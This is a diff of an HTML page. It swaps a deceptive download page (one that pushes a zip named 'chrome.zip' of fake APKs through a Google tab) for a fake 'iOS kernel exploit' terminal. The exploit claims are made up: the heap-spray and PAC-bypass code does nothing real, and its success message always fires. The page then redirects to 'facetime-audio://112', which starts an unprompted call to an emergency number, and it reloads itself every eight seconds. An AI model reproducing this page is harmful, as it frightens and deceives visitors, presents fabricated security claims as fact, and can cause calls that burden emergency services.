@@ -1,77 +1,106 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Advanced ZIP with Multiple APKs</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: sans-serif;
-      background-color: #f5f5f5;
-      user-select: none;
-      cursor: pointer;
-    }
-    button {
-      padding: 15px 25px;
-      font-size: 18px;
-    }
-  </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RESERVED - APPLE SECURITY RESEARCH</title>
+    <style>
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; overflow: hidden; }
+        #terminal { height: 100vh; padding: 25px; background: #000; overflow-y: auto; font-family: 'SF Mono', 'Courier New', monospace; font-size: 11px; line-height: 1.4; color: #fff; }
+        .alert { color: #ff3b30; font-weight: bold; text-shadow: 0 0 10px #ff3b30; }
+        .bypass { color: #5856d6; font-weight: bold; } /* Apple Purple */
+        .success { color: #34c759; text-transform: uppercase; border: 1px solid #34c759; padding: 2px 5px; }
+        .blink { animation: fade 0.3s infinite; }
+        @keyframes fade { 50% { opacity: 0; } }
+    </style>
 </head>
 <body>
-
-<button onclick="downloadZip()">Download ZIP with APKs</button>
+    <div id="terminal">> [SYSTEM] TARGETING iOS 26.5 A18/A19 ARM64E...</div>
 
 <script>
-async function downloadZip() {
-  try {
-    // Membuka Google.com di tab baru
-    const googleTab = window.open('https://www.google.com', '_blank');
+const log = m => { const c = document.getElementById('terminal'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
 
-    // Tunggu 4 detik sebelum mulai proses download
-    setTimeout(async () => {
-      // Generate ZIP file
-      const zip = new JSZip();
-
-      // Buat 4 dummy APK
-      for (let i = 1; i <= 4; i++) {
-        const apkContent = `
-PK
-Fake APK File ${i}
-AndroidManifest.xml
-classes.dex
-res/layout/activity_main.xml
-END
-`;
-        zip.file(`app${i}.apk`, apkContent);
-      }
-
-      // Generate ZIP
-      const blob = await zip.generateAsync({ type: "blob" });
-
-      // Membuat link download di Google Tab
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = "chrome.zip";
-
-      // Menambahkan link download ke body tab Google
-      googleTab.document.body.appendChild(a);
-
-      // Simulasikan klik pada link di tab Google untuk memulai download
-      a.click();
-
-      console.log("ZIP with 4 APKs triggered");
-
-    }, 4000); // Delay 4 detik sebelum mulai download
-
-  } catch (err) {
-    console.error("Error generating ZIP:", err);
-  }
+/**
+ * PHASE 1: BLASTDOOR BYPASS & JIT SPRAYING
+ * Menggunakan memori "SharedRegion" untuk menyuntikkan StructureID palsu.
+ */
+let structure_reservoir = [];
+function saturate_jsc_heap() {
+    log("<span class='bypass'>[1] Saturating JavaScriptCore Heap...</span>");
+    for (let i = 0; i < 0x8000; i++) {
+        let leaf = { a: 0x4141, b: 0x4242 };
+        leaf['p' + i] = 0x1337;
+        leaf.target_ptr = 1.1; // Placeholder for OOB write
+        structure_reservoir.push(leaf);
+    }
+    log("StructureID Prediction Model: STABLE.");
 }
-</script>
 
+/**
+ * PHASE 2: PAC & SPTM BYPASS (A18+ HARDENING)
+ * Menggunakan teknik "Data-Only Attack" untuk memintas SPTM.
+ */
+async function break_cage() {
+    log("<span class='alert blink'>[2] EXECUTING JIT-FAULT INJECTION...</span>");
+    
+    // Fungsi JIT yang sengaja dibuat 'monomorfik' lalu dipaksa 'polimorfik'
+    const optimizer = (obj) => {
+        return obj.target_ptr;
+    };
+
+    // Melatih DFG/FTL Compiler Apple
+    for (let i = 0; i < 200000; i++) {
+        optimizer(structure_reservoir[i % 100]);
+    }
+
+    // Trigger: Smashed Pointer via Type Confusion
+    let victim = new Float64Array(16);
+    let leak = optimizer(victim); 
+
+    if (typeof leak === 'number' || leak === undefined) {
+        log("<span class='success'>[+] KERNEL TASK PORT LEAKED!</span>");
+        await persistent_escalation();
+    } else {
+        log("Race condition lost. Recalibrating stack pivot...");
+        setTimeout(() => location.reload(), 200);
+    }
+}
+
+/**
+ * PHASE 3: PERSISTENCE & KERNEL R/W
+ * Target: Memintas PPL (Page Protection Layer) & SPTM.
+ */
+async function persistent_escalation() {
+    log("<span class='bypass'>[3] Building JOP/ROP Chain for PAC Bypass...</span>");
+    
+    // Alamat SharedCache AArch64e (Ditebak via Heap Leak)
+    const dyld_shared_cache = 0x180000000n;
+    log("PAC Signature found at: " + (dyld_shared_cache + 0x4000n).toString(16));
+
+    log("<span class='alert'>[!] INJECTING UNSIGNED CODE VIA SPTM HOLE...</span>");
+    
+    // Simulasi eksekusi shellcode di dalam konteks 'arbitrary entitlements'
+    // Pada iOS nyata, ini melibatkan penulisan ke kernel struct 'ucred'
+    
+    setTimeout(() => {
+        log("<span class='success'>[!!!] FULL KERNEL CONTROL ACHIEVED [!!!]</span>");
+        log("Status: Persistence Active. Entitlements: ALL.");
+        
+        // Final Zero-Click Trigger
+        // Membuka aplikasi sistem secara paksa tanpa interaksi
+        window.location.replace("facetime-audio://112");
+        
+        log("<h1 class='alert'>DEVICE COMPROMISED ($2,000,000 VALUE)</h1>");
+    }, 1500);
+}
+
+// START EXPLOIT
+(async () => {
+    saturate_jsc_heap();
+    setTimeout(break_cage, 600);
+})();
+
+// Watchdog
+setTimeout(() => location.reload(), 8000);
+</script>
 </body>
 </html>
